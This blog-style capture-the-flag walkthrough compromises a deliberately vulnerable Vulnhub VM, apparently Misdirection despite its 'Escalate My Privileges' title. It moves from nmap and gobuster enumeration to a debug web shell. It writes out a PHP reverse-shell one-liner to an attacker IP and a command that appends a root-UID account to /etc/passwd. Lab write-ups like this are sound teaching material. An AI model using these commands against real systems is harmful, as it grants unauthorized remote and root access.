---
title: ESCALATE MY PRIVILEGES - Vulnhub Walkthrough
date: 2021-08-13 05:35:00 +0200
categories: [VlunHub]
tags: [vulnhub, ESCALATE_MY_PRIVILEGES, privilege_escalation] 

---

# INIT

identify target IP 

```console
➜  ~ nmap -sP 172.16.129.128/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 10:52 EDT
Nmap scan report for Home (172.16.129.1)
Host is up (0.0018s latency).
Nmap scan report for 172.16.129.2
Host is up (0.0016s latency).
Nmap scan report for 172.16.129.128
Host is up (0.0024s latency).
Nmap scan report for 172.16.129.143
Host is up (0.012s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.69 seconds
```



edit `/etc/hosts` file (local DNS)

```console
# Vulnhub
172.16.129.143	misdirection.vuln
```

lets starting ...

# Scanning

### Nmap

```console
➜  ~ sudo nmap -A -T4 -p- misdirection.vuln 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 11:03 EDT
Nmap scan report for misdirection.vuln (172.16.129.143)
Host is up (0.00035s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache  2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:F0:42:1E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms misdirection.vuln (172.16.129.143)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.09 seconds
```



# Enumeration

**port 80** is opened let's take a look

![image-20210814192658238](/assets/2021-08-14-MISDIRECTION.assets/image-20210814192658238.png)

after some time no thing interesting here ...

**port 8080** is opened let's take a look

![image-20210814192837195](/assets/2021-08-14-MISDIRECTION.assets/image-20210814192837195.png)

default page ...

**Check directory**

```console
➜  ~ gobuster dir -u http://misdirection.vuln:8080/ -w ~/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://misdirection.vuln:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/x/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/14 13:29:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/.hta                 (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 327] [--> http://misdirection.vuln:8080/css/]
/debug                (Status: 301) [Size: 329] [--> http://misdirection.vuln:8080/debug/]
/development          (Status: 301) [Size: 335] [--> http://misdirection.vuln:8080/development/]
/help                 (Status: 301) [Size: 328] [--> http://misdirection.vuln:8080/help/]       
/images               (Status: 301) [Size: 330] [--> http://misdirection.vuln:8080/images/]     
/index.html           (Status: 200) [Size: 10918]                                               
/js                   (Status: 301) [Size: 326] [--> http://misdirection.vuln:8080/js/]         
/manual               (Status: 301) [Size: 330] [--> http://misdirection.vuln:8080/manual/]     
/scripts              (Status: 301) [Size: 331] [--> http://misdirection.vuln:8080/scripts/]    
/server-status        (Status: 403) [Size: 307]                                                 
/shell                (Status: 301) [Size: 329] [--> http://misdirection.vuln:8080/shell/]      
/wordpress            (Status: 301) [Size: 333] [--> http://misdirection.vuln:8080/wordpress/]  
                                                                                                
===============================================================
2021/08/14 13:29:49 Finished
===============================================================
```

lets take a look on `/debug` 

![image-20210814193110373](/assets/2021-08-14-MISDIRECTION.assets/image-20210814193110373.png)

- [x] Service Account Access

# Exploiting

**Reverse shell**

setup listening port on attacker machine `nc -nlvp 1234` 

on debug shell

`php -r '$sock=fsockopen("172.16.129.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

now we have reverse shell ...

# Privilege Escalation

check sudo privilege ...

`sudo -l`

![image-20210814193841514](/assets/2021-08-14-MISDIRECTION.assets/image-20210814193841514.png)

run bash as `brexit`

![image-20210814193930152](/assets/2021-08-14-MISDIRECTION.assets/image-20210814193930152.png)





- [x] Regular User Account Access



check privilege of `/etc/passwd`

![image-20210814194059862](/assets/2021-08-14-MISDIRECTION.assets/image-20210814194059862.png)

we can write to passwd file 

lets create passwd 

```console
➜  ~ openssl passwd -1                                                                            
Password: 
Verifying - Password: 
$1$kUm/wCpt$BgXJbNsCAwz0WkdWfzKdp/
```

add this line to passwd file

```console
echo 'hacker:$1$kUm/wCpt$BgXJbNsCAwz0WkdWfzKdp/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

login as hacker

![image-20210814194645510](/assets/2021-08-14-MISDIRECTION.assets/image-20210814194645510.png)

- [x] Root User Account Access

